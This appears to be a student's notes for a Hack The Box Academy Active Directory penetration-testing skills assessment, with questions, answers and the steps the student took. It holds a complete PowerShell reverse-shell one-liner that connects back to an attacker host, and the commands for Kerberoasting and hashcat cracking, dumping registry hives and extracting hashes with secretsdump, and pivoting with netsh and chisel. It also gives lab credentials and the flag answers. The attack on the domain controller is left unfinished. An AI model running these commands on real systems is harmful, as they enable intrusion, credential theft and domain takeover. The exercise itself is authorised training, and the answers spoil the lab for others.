Scenario
A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server.
Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

xfreerdp /v:10.129.2.44 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop


$client = New-Object System.Net.Sockets.TCPClient('10.10.14.128',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


Question 1 - Submit the contents of the flag.txt file on the administrator Desktop of the web server - JusT_g3tt1ng_st@rt3d!
1) go to http://10.129.202.242/uploads/antak.aspx 
2) login with provided creds 
3) revsheslls.com -> powershell reverse shell to copy into webshell we logged into 
4) nc -nlvp 4445 on host machine 
5) get connection
6) cd C:\Users\Administrator\Desktop 
7) get-content flag.txt - JusT_g3tt1ng_st@rt3d!
 


Question 2 - Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer - svc_sql
1) on Host machine run sudo mv /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 . to move poweview to desktop
2) python3 -m http.server 
3) ON REVERSEHLLLLL -> Invoke-WebRequest -URI "http://10.10.14.128:8000/PowerView.ps1" -OutFile ./PowerView.ps1 
4) ON REVERSE SHELL -> Import-Module ./PowerView.ps1
5) ON REVERSE SHELL -> Get-NetUser -SPN | select name,samaccountname,serviceprincipalname,description
6) OutPut: svc_sql      svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433                                            
 





Question 3 - Crack the account's password. Submit the cleartext value.
1) Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
2) Get-Content ilfreight_tgs.csv
3) copy and paste all output to note ( or just svbc_sql) 
4) hashcat -m 13100 sqlhash /usr/share/wordlists/rockyou.txt 
5) output of cracked hash = lucky7 


Question 4 -  Submit the contents of the flag.txt file on the Administrator desktop on MS01 - spn$_r0ast1ng_on_@n_0p3n_f1re 
1) ON REVERSE SHELL -> mkdir c:\tools
2) cd C:\tools 
3) reg.exe save hklm\sam C:\tools\sam.save
reg.exe save hklm\system C:\tools\system.save
reg.exe save hklm\security C:\tools\security.save
4) this is where im stuck trying to transfer back to Host machine
5) okay after multiple attempts to transfer the .save fiels nothing worked. since we have the user name and password im going to try a different route and proxychain from the powershell session then xfreerdp into ol boy... stand by 
6) reverse shell back 
7) ipconfig /all -> IPv4 Address. . . . . . . . . . . : 172.16.6.100(Preferred) + Default Gateway . . . . . . . . . : 172.16.6.1 + DNS Servers . . . . . . . . . . . : 172.16.6.3
8) import-Module PowerView.ps1 again 
9) Get-DomainController -> IPAddress: 172.16.6.3 
10) for($i=2;$i -lt 255;$i++){ping -n 1 172.16.6.$i | findstr TTL}
11) replys from 172.16.6.3 + 172.16.6.50 + 172.16.6.100 -> .3 is DC .100 = us so 50 must be MS01 
12) netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.202.242 connectport=3389 connectaddress=172.16.6.50
13) netsh.exe interface portproxy show v4tov4 -> jsut to confirm 
14) xfreerdp /v:10.129.202.242:8080 /u:svc_sql /p:lucky7 /dynamic-resolution +clipboard /drive:shared,/home/htb-ac-1235531/Desktop
15) C drive and navigate to administrator desktop -> spn$_r0ast1ng_on_@n_0p3n_f1re 


Question 5 - Find cleartext credentials for another domain user. Submit the username as your answer. - tpetty 
1) ON XFREERDP SESSION 
2) reg.exe save hklm\sam C:\tools\sam.save
reg.exe save hklm\system C:\tools\system.save
reg.exe save hklm\security C:\tools\security.save
3) now we have a shared drive set up finally.... just copy and paste to KALI machine 
4) secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
5) output we get hashes and user of: tpetty and pass of Sup3rS3cur3D0m@inU2eR 


Question 6 -  Submit this user's cleartext password. - Sup3rS3cur3D0m@inU2eR 
1) steps above 


Question 7 -  What attack can this user perform?
1) after finding tpettys ACLs and GUIDs we can perform a DCSync attack with that account. 


Question 8 - Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01 - r3plicat1on_m@st3r! 
.\chisel.exe client 10.10.14.128:8080 R:socks

i literally hate HTB labs dude.. i have 3 ways to complete this and of course none are working :] basically we need proxychains or portfwd to actually work, then we just take all the info we found and either past the ticket with impacket OR evilwinrm but none are working so cool.
